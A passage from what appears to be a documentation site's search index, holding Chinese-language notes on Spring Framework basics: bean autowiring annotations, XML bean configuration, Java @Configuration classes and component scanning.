```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; public class People { @Autowired(required = false) private Dog dog; } \u5982\u679c\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\u7684bean\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528@Qualifier\u6ce8\u89e3\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u540d\u5b57\u7684bean ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; public class People { @Autowired @Qualifier(value = \"dog\") private Dog dog; } \u5728java<11\u4e2djva\u539f\u751f\u81ea\u5e26\u4e86\u4e00\u4e2a@Resource\u6ce8\u89e3\uff0c\u5b83\u7684\u4f5c\u7528\u548c@Autowired\u7c7b\u4f3c\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u65e0\u6cd5\u627e\u5230\u5bf9\u5e94\u7684id\uff0c\u5219\u7c7b\u4f3cbyType\u81ea\u52a8\u88c5\u914d\uff0c\u540c\u65f6\u5b83\u53ef\u4ee5\u6267\u884cname\u5c5e\u6027\u6765\u6307\u5411\u5177\u4f53\u7684\u4e00\u4e2abean package top.longlone ; import javax.annotation.Resource ; public class People { @Resource ( name = \"dog22\" ) private Dog dog ; } java11\u53ca\u4e4b\u540e\u9700\u8981\u901a\u8fc7\u6dfb\u52a0\u4f9d\u8d56\u7684\u65b9\u5f0f\u624d\u80fd\u4f7f\u7528@Resource\u6ce8\u89e3 <dependency> <groupId> javax.annotation </groupId> <artifactId> javax.annotation-api </artifactId> <version> 1.3.1 </version> </dependency>","title":"\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u603b\u7ed3","text":"Bean\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662f\u901a\u8fc7xml\u548c\u901a\u8fc7\u6ce8\u89e3\u3002 Bean\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662fbyName\uff0cbyType\u548cconstructor\u3002 Bean\u901a\u8fc7\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u4e2a\u5e38\u89c1\u6ce8\u89e3\uff0c\u5206\u522b@Autowired\uff0c@Qualfilter\uff0c@Resource","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/","tags":["java","spring"],"text":"HelloSpring # \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\u53bb\u4f53\u73b0Spring\u7684\u601d\u60f3 package top.longlone ; public class HelloSpring { private String str ; public String getStr () { return str ; } public void setStr ( String str ) { this . str = str ; } @Override public String toString () { return \"HelloSpring{\" + \"str='\" + str + '\\'' + '}' ; } } <!-- beans.xml --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <!-- \u901a\u8fc7Spring\u7ba1\u7406\u7684\u7c7b\u53ebBean \u4e00\u4e2aid\u5bf9\u5e94\u4e00\u4e2aBean Spring\u901a\u8fc7\u53cd\u5c04\u521b\u5efaBean\uff0c\u6211\u4eec\u901a\u8fc7id\u83b7\u53d6Bean property\u7528\u4e8e\u7ed9Bean\u7684\u5c5e\u6027\u8bbe\u7f6e\u503c\uff0cvalue\u6307\u5b9a\u4e00\u4e2a\u503c\uff0cref\u6307\u5411\u4e00\u4e2aBean --> <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <property name= \"str\" value= \"Spring\" /> </bean> </beans> import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.HelloSpring ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"beans.xml\" ); HelloSpring hello = ( HelloSpring ) context . getBean ( \"hello\" ); System . out . println ( hello . toString ()); } } ```` \u53ef\u4ee5\u770b\u5230Spring\u5e2e\u52a9\u6211\u4eec\u521b\u5efa \uff0c \u7ba1\u7406 \uff0c \u5206\u914d\u5bf9\u8c61 \uff0c \u6211\u4eec\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u53bbnew\u4e00\u4e2a\u5bf9\u8c61\u4e86 \uff0c Spring\u4e2d\u7684\u5bf9\u8c61\u9ed8\u8ba4\u662f\u5355\u4f8b\u6a21\u5f0f \uff0c \u5728\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u65f6\u5bf9\u8c61\u5df2\u7ecf\u6ce8\u518c\u4e86 \u3002 ## \u4f7f\u7528\u6784\u9020\u51fd\u6570 \u524d\u9762xml\u4e2d\u8bbe\u7f6e\u5c5e\u6027\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528setter\u65b9\u6cd5\u53bb\u8bbe\u7f6e\u7684 \uff0c \u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6784\u9020\u51fd\u6570\u53bb\u8bbe\u7f6e\u5c5e\u6027 \uff0c \u4f8b\u5982 \uff1a ``` java public class HelloSpring { public HelloSpring () { } public HelloSpring ( String str ) { this . str = str ; } // ... } - \u5bf9\u5e94\u7684xml\u5982\u4e0b\uff1a ... <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <constructor-arg index= \"0\" value= \"whoami\" ></constructor-arg> <!-- \u4e0b\u6807\u65b9\u5f0f --> <constructor-arg name= \"str\" value= \"whoami\" ></constructor-arg> <!-- \u53d8\u91cf\u540d\u65b9\u5f0f --> </bean> ... \u603b\u7ed3 # \u7b80\u5355\u4e86\u89e3\u4e86\u5982\u4f55\u4f7f\u7528Spring\u7684XML\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff0c\u7ba1\u7406\uff0c\u5206\u914d\u5bf9\u8c61\u3002 \u5728Spring\u4e2dBean\u662f\u5176\u7ba1\u7406\u7684\u5bf9\u8c61\uff0c\u662f\u7a0b\u5e8f\u6784\u5efa\u7684\u57fa\u672c\u5757\u3002Bean\u5176\u5b9e\u662f\u7b26\u5408\u4e00\u5b9a\u89c4\u8303\u7f16\u5199\u7684Java\u7c7b\uff0c\u8fd9\u4e9b\u89c4\u8303\u5206\u522b\u662f 1. \u6240\u6709\u5c5e\u6027\u4e3aprivate 2. \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 3. \u63d0\u4f9bgetter\u548csetter 4. \u5b9e\u73b0serializable\u63a5\u53e3","title":"HelloSpring"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/#hellospring","text":"\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\u53bb\u4f53\u73b0Spring\u7684\u601d\u60f3 package top.longlone ; public class HelloSpring { private String str ; public String getStr () { return str ; } public void setStr ( String str ) { this . str = str ; } @Override public String toString () { return \"HelloSpring{\" + \"str='\" + str + '\\'' + '}' ; } } <!-- beans.xml --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <!-- \u901a\u8fc7Spring\u7ba1\u7406\u7684\u7c7b\u53ebBean \u4e00\u4e2aid\u5bf9\u5e94\u4e00\u4e2aBean Spring\u901a\u8fc7\u53cd\u5c04\u521b\u5efaBean\uff0c\u6211\u4eec\u901a\u8fc7id\u83b7\u53d6Bean property\u7528\u4e8e\u7ed9Bean\u7684\u5c5e\u6027\u8bbe\u7f6e\u503c\uff0cvalue\u6307\u5b9a\u4e00\u4e2a\u503c\uff0cref\u6307\u5411\u4e00\u4e2aBean --> <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <property name= \"str\" value= \"Spring\" /> </bean> </beans> import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.HelloSpring ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"beans.xml\" ); HelloSpring hello = ( HelloSpring ) context . getBean ( \"hello\" ); System . out . println ( hello . toString ()); } } ```` \u53ef\u4ee5\u770b\u5230Spring\u5e2e\u52a9\u6211\u4eec\u521b\u5efa \uff0c \u7ba1\u7406 \uff0c \u5206\u914d\u5bf9\u8c61 \uff0c \u6211\u4eec\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u53bbnew\u4e00\u4e2a\u5bf9\u8c61\u4e86 \uff0c Spring\u4e2d\u7684\u5bf9\u8c61\u9ed8\u8ba4\u662f\u5355\u4f8b\u6a21\u5f0f \uff0c \u5728\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u65f6\u5bf9\u8c61\u5df2\u7ecf\u6ce8\u518c\u4e86 \u3002 ## \u4f7f\u7528\u6784\u9020\u51fd\u6570 \u524d\u9762xml\u4e2d\u8bbe\u7f6e\u5c5e\u6027\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528setter\u65b9\u6cd5\u53bb\u8bbe\u7f6e\u7684 \uff0c \u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6784\u9020\u51fd\u6570\u53bb\u8bbe\u7f6e\u5c5e\u6027 \uff0c \u4f8b\u5982 \uff1a ``` java public class HelloSpring { public HelloSpring () { } public HelloSpring ( String str ) { this . str = str ; } // ... } - \u5bf9\u5e94\u7684xml\u5982\u4e0b\uff1a ... <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <constructor-arg index= \"0\" value= \"whoami\" ></constructor-arg> <!-- \u4e0b\u6807\u65b9\u5f0f --> <constructor-arg name= \"str\" value= \"whoami\" ></constructor-arg> <!-- \u53d8\u91cf\u540d\u65b9\u5f0f --> </bean> ...","title":"HelloSpring"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/#\u603b\u7ed3","text":"\u7b80\u5355\u4e86\u89e3\u4e86\u5982\u4f55\u4f7f\u7528Spring\u7684XML\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff0c\u7ba1\u7406\uff0c\u5206\u914d\u5bf9\u8c61\u3002 \u5728Spring\u4e2dBean\u662f\u5176\u7ba1\u7406\u7684\u5bf9\u8c61\uff0c\u662f\u7a0b\u5e8f\u6784\u5efa\u7684\u57fa\u672c\u5757\u3002Bean\u5176\u5b9e\u662f\u7b26\u5408\u4e00\u5b9a\u89c4\u8303\u7f16\u5199\u7684Java\u7c7b\uff0c\u8fd9\u4e9b\u89c4\u8303\u5206\u522b\u662f 1. \u6240\u6709\u5c5e\u6027\u4e3aprivate 2. \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 3. \u63d0\u4f9bgetter\u548csetter 4. \u5b9e\u73b0serializable\u63a5\u53e3","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/","tags":["java","spring"],"text":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e # \u5728Spring\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528java\u4ee3\u7801\u8fdb\u884cspring\u7684\u914d\u7f6e\uff0c\u8fd9\u79cd\u65b9\u5f0f\u76f8\u6bd4xml\u66f4\u52a0\u7684\u7075\u6d3b package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } } \u8fd9\u76f8\u5f53\u4e8exml\u914d\u7f6e\u4e2d\u7684 <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" /> </beans> \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u76f8\u5173\u5e38\u7528\u7684\u6ce8\u89e3 \u76f8\u5173\u6ce8\u89e3 # @Configuration # \u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u7c7b\u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u914d\u7f6e\u5176\u4ed6bean @Import # \u76f8\u5f53\u4e8exml\u4e2d\u7684 <import> \u6807\u7b7e\uff0c\u7528\u4e8e\u5305\u542b\u5176\u4ed6\u914d\u7f6e\u7c7b CompoentScan # \u5728java\u7c7b\u4ee3\u7801\u4e2d\u6bcf\u6b21\u521b\u5efa\u4e00\u4e2abean\u90fd\u9700\u8981\u5728\u914d\u7f6e\u7c7b\u4e2d\u5199\u4e00\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u6837\u5f88\u4e0d\u65b9\u4fbf\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5305\u626b\u63cf\u7684\u65b9\u5f0f\uff0c\u76f8\u5f53\u4e8exml\u4e2d\u7684 <context:component-scan base-package=\"\"/> package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration @ComponentScan ({ \"top.longlone\" }) public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } } \u603b\u7ed3 # \u8fd9\u79cd\u914d\u7f6e\u7c7b\u7ecf\u5e38\u89c1\u4e8eSpringBoot\u4e2d\u3002\u662fspring4\u4e4b\u540e\u63a8\u8350\u4f7f\u7528\u7684\u914d\u7f6e\u65b9\u5f0f\u3002\u5b83\u548cxml\u914d\u7f6e\u6587\u4ef6\u4efb\u9009\u5176\u4e00\u4f5c\u4e3aspring\u7684\u914d\u7f6e\u65b9\u5f0f\u5373\u53ef\u3002","title":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e","text":"\u5728Spring\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528java\u4ee3\u7801\u8fdb\u884cspring\u7684\u914d\u7f6e\uff0c\u8fd9\u79cd\u65b9\u5f0f\u76f8\u6bd4xml\u66f4\u52a0\u7684\u7075\u6d3b package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } } \u8fd9\u76f8\u5f53\u4e8exml\u914d\u7f6e\u4e2d\u7684 <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" /> </beans> \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u76f8\u5173\u5e38\u7528\u7684\u6ce8\u89e3","title":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#\u76f8\u5173\u6ce8\u89e3","text":"","title":"\u76f8\u5173\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#configuration","text":"\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u7c7b\u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u914d\u7f6e\u5176\u4ed6bean","title":"@Configuration"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#import","text":"\u76f8\u5f53\u4e8exml\u4e2d\u7684 <import> \u6807\u7b7e\uff0c\u7528\u4e8e\u5305\u542b\u5176\u4ed6\u914d\u7f6e\u7c7b","title":"@Import"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#compoentscan","text":"\u5728java\u7c7b\u4ee3\u7801\u4e2d\u6bcf\u6b21\u521b\u5efa\u4e00\u4e2abean\u90fd\u9700\u8981\u5728\u914d\u7f6e\u7c7b\u4e2d\u5199\u4e00\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u6837\u5f88\u4e0d\u65b9\u4fbf\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5305\u626b\u63cf\u7684\u65b9\u5f0f\uff0c\u76f8\u5f53\u4e8exml\u4e2d\u7684 <context:component-scan base-package=\"\"/> package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration @ComponentScan ({ \"top.longlone\" }) public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } }","title":"CompoentScan"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"\u8fd9\u79cd\u914d\u7f6e\u7c7b\u7ecf\u5e38\u89c1\u4e8eSpringBoot\u4e2d\u3002\u662fspring4\u4e4b\u540e\u63a8\u8350\u4f7f\u7528\u7684\u914d\u7f6e\u65b9\u5f0f\u3002\u5b83\u548cxml\u914d\u7f6e\u6587\u4ef6\u4efb\u9009\u5176\u4e00\u4f5c\u4e3aspring\u7684\u914d\u7f6e\u65b9\u5f0f\u5373\u53ef\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/","tags":["java","spring"],"text":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e # \u524d\u63d0 # <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> <context:component-scan base-package= \"top.longlone\" /> </beans> spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3 # @Resource # \u53c2\u8003 Bean\u7684\u88c5\u914d @Component # \u7528\u4e8e\u6ce8\u89e3\u7c7b\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5f80spring\u4e2d\u6ce8\u518c\u8fd9\u4e2a\u7c7b\u4e3aBean\uff0c\u8981\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u5fc5\u987b\u5728xml\u4e2d\u914d\u7f6e context:compoent-scan Repository # \u540cComponent\uff0c\u7528\u4e8eDAO\u5c42 Service # \u540cComponent\uff0c\u7528\u4e8eService\u5c42 Controller # \u540cComponent\uff0c\u7528\u4e8eController\u5c42 Scope # \u540cxml\u4e2dbean\u4e0b\u7684scope\u5c5e\u6027\uff0c\u7528\u4e8e\u8bbe\u7f6ebean\u7684\u4f5c\u7528\u57df(\u5355\u4f8b\u6a21\u5f0f\uff0c\u539f\u578b\u6a21\u5f0f\u7b49)\uff0c\u4f8b\u5982 @Scope(\"singleton\") @Value # \u6ce8\u89e3\u5c5e\u6027\u6216\u8005set\u65b9\u6cd5\uff0c\u7528\u4e8e\u81ea\u52a8\u8bbe\u7f6e\u5b9e\u4f8b\u5c5e\u6027\u503c\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" value=\"...\"/> \uff0c\u4f8b\u5982 @Value(\"whoami\") @Autowired # \u7528\u4e8e\u81ea\u52a8\u88c5\u914d\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" ref=\"...\"/> \u53c2\u8003 Bean\u7684\u88c5\u914d @Qualfilter # \u53c2\u8003 Bean\u7684\u88c5\u914d \u603b\u7ed3 # xml\u9002\u7528\u6027\u66f4\u9ad8\uff0c\u6ce8\u89e3\u66f4\u7b80\u6d01\uff0c\u4f46\u662f\u590d\u6742\u7684\u914d\u7f6e\u8fd8\u662f\u5e94\u8be5\u4f7f\u7528xml\u8fdb\u884c\u914d\u7f6e\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528xml\u8fdb\u884cbean\u7684\u7ba1\u7406\uff0c\u7136\u540e\u4f7f\u7528\u6ce8\u89e3\u5b8c\u6210\u5c5e\u6027\u6ce8\u5165\u3002","title":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e","text":"","title":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#\u524d\u63d0","text":"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> <context:component-scan base-package= \"top.longlone\" /> </beans>","title":"\u524d\u63d0"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3","text":"","title":"spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#resource","text":"\u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Resource"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#component","text":"\u7528\u4e8e\u6ce8\u89e3\u7c7b\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5f80spring\u4e2d\u6ce8\u518c\u8fd9\u4e2a\u7c7b\u4e3aBean\uff0c\u8981\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u5fc5\u987b\u5728xml\u4e2d\u914d\u7f6e context:compoent-scan","title":"@Component"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#repository","text":"\u540cComponent\uff0c\u7528\u4e8eDAO\u5c42","title":"Repository"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#service","text":"\u540cComponent\uff0c\u7528\u4e8eService\u5c42","title":"Service"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#controller","text":"\u540cComponent\uff0c\u7528\u4e8eController\u5c42","title":"Controller"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#scope","text":"\u540cxml\u4e2dbean\u4e0b\u7684scope\u5c5e\u6027\uff0c\u7528\u4e8e\u8bbe\u7f6ebean\u7684\u4f5c\u7528\u57df(\u5355\u4f8b\u6a21\u5f0f\uff0c\u539f\u578b\u6a21\u5f0f\u7b49)\uff0c\u4f8b\u5982 @Scope(\"singleton\")","title":"Scope"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#value","text":"\u6ce8\u89e3\u5c5e\u6027\u6216\u8005set\u65b9\u6cd5\uff0c\u7528\u4e8e\u81ea\u52a8\u8bbe\u7f6e\u5b9e\u4f8b\u5c5e\u6027\u503c\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" value=\"...\"/> \uff0c\u4f8b\u5982 @Value(\"whoami\")","title":"@Value"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#autowired","text":"\u7528\u4e8e\u81ea\u52a8\u88c5\u914d\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" ref=\"...\"/> \u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Autowired"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#qualfilter","text":"\u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Qualfilter"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"xml\u9002\u7528\u6027\u66f4\u9ad8\uff0c\u6ce8\u89e3\u66f4\u7b80\u6d01\uff0c\u4f46\u662f\u590d\u6742\u7684\u914d\u7f6e\u8fd8\u662f\u5e94\u8be5\u4f7f\u7528xml\u8fdb\u884c\u914d\u7f6e\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528xml\u8fdb\u884cbean\u7684\u7ba1\u7406\uff0c\u7136\u540e\u4f7f\u7528\u6ce8\u89e3\u5b8c\u6210\u5c5e\u6027\u6ce8\u5165\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/","tags":["java","spring"],"text":"Spring\u4f7f\u7528XML\u914d\u7f6e # alias # \u7528\u4e8e\u7ed9\u5b58\u5728\u7684bean\u8d77\u522b\u540d\uff0c\u4f8b\u5982\u7ed9user\u8d77\u522b\u540d\u4e3auserNew <alias name= \"user\" alias= \"userNew\" /> bean # id: bean\u7684\u552f\u4e00\u6807\u8bc6\u7b26 class: bean\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b8c\u6574\u7c7b\u540d\uff08\u5305\u540d+\u7c7b\u540d\uff09 name: \u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u9017\u53f7\u53d6\u591a\u4e2a\u522b\u540d <bean id= \"hello\" class= \"top.longlone.HelloSpring\" name= \"h1,h2\" > <property name= \"str\" value= \"Spring\" /> </bean> import # \u4e00\u822c\u7528\u4e8e\u56e2\u961f\u5f00\u53d1\u4f7f\u7528\uff0c\u53ef\u4ee5\u5bfc\u5165\u5176\u4ed6\u914d\u7f6e\u6587\u4ef6 <import resource= \"beans.xml\" /> \u603b\u7ed3 # \u4e86\u89e3\u4e86Spring 